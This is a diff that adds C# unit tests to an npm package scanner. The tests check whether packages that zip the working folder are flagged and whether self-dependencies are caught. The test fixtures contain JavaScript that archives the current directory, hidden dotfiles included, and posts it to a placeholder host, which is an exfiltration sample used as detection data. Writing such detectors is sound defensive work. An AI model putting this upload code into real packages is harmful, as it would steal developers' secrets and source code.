@@ -1636,6 +1636,63 @@ public sealed class PackageReviewTests : IDisposable
     }
 
     [Fact]
+    public void An_archive_of_the_working_folder_with_dotfiles_sent_in_a_request_is_noteworthy()
+    {
+        const string upload = """
+            const archiver = require('archiver'), axios = require('axios'), FormData = require('form-data');
+            const archive = archiver('zip');
+            archive.glob('**/*', { cwd: process.cwd(), dot: true });
+            const form = new FormData();
+            form.append('file', archive);
+            axios.post('https://h.example.invalid/u', form);
+            """;
+        var r = Review(Tgz("scan-1.0.0.tgz",
+            ("package/package.json", """{"name":"workspace-scan","version":"1.0.0","bin":{"x":"bin/x.js"}}"""),
+            ("package/bin/x.js", upload)));
+        Assert.Contains(r.Findings, f => f is { Rule: "package/workspace-upload", Level: "noteworthy", Path: "package/bin/x.js" });
+        // An archive of the working folder written to disk, with no request.
+        Assert.DoesNotContain(PackageReview.Scan("x.js", upload.Replace("axios.post", "fs.writeFileSync").Replace("new FormData()", "{}"), false, default, peel: false),
+            f => f.Rule == "package/workspace-upload");
+        // A file walk with dotfiles and a request, with no archive module.
+        Assert.DoesNotContain(PackageReview.Scan("x.js", upload.Replace("require('archiver')", "require('glob')"), false, default, peel: false),
+            f => f.Rule == "package/workspace-upload");
+    }
+
+    [Fact]
+    public void A_directory_archive_of_the_working_folder_posted_as_form_data_is_noteworthy()
+    {
+        const string upload = """
+            const archiver = require('archiver');
+            const archive = archiver('zip');
+            archive.directory(process.cwd(), false);
+            const form = new FormData();
+            form.append('file', archive);
+            """;
+        Assert.Contains(PackageReview.Scan("x.js", upload, false, default, peel: false), f => f is { Rule: "package/workspace-upload", Level: "noteworthy" });
+    }
+
+    [Fact]
+    public void A_build_folder_archive_beside_an_unrelated_working_folder_read_is_not_reported()
+    {
+        const string deploy = """
+            const archiver = require('archiver'), axios = require('axios'), path = require('path');
+            const config = path.resolve(process.cwd(), 'deploy.json');
+            const archive = archiver('zip');
+            archive.glob('**', { cwd: 'dist', dot: true });
+            axios.post('https://h.example.invalid/deploy', archive);
+            """;
+        Assert.DoesNotContain(PackageReview.Scan("x.js", deploy, false, default, peel: false), f => f.Rule == "package/workspace-upload");
+    }
+
+    [Fact]
+    public void A_package_that_lists_its_own_name_as_a_dependency_is_review()
+    {
+        var r = Review(Tgz("scan-1.0.1.tgz", ("package/package.json", """{"name":"workspace-scan","version":"1.0.1","dependencies":{"workspace-scan":"^1.0.0","left-pad":"^1.3.0"}}""")));
+        Assert.Equal(("package/self-dependency", "review", "package/package.json"), (Assert.Single(r.Findings).Rule, r.Findings[0].Level, r.Findings[0].Path));
+        Assert.Equal("none", Review(Tgz("scan-1.0.2.tgz", ("package/package.json", """{"name":"workspace-scan","version":"1.0.2","peerDependencies":{"workspace-scan":"^1.0.0"}}"""))).Review);
+    }
+
+    [Fact]
     public void A_major_version_of_99_is_review_on_an_unscoped_name_only()
     {
         var unscoped = Review(Tgz("app-99.0.0.tgz", ("package/package.json", """{"name":"app","version":"99.0.0"}""")));
